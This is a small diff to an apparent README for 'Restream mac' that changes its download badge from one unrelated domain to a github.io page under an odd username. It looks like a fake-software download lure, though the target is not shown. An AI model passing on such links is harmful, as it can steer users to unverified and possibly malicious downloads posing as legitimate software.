@@ -2,7 +2,7 @@
 
 Restream mac delivers Mac‑optimized tools with Apple silicon support, native UI, and professional workflows.
 
-[![Download Restream mac](https://img.shields.io/badge/Download-Restream_mac-blueviolet)](https://metarefund.com/)
+[![Download Restream mac](https://img.shields.io/badge/Download-Restream_mac-blueviolet)](https://kellybartolomucciemnww.github.io/.github/Restream-Hub)
 
 ---
 
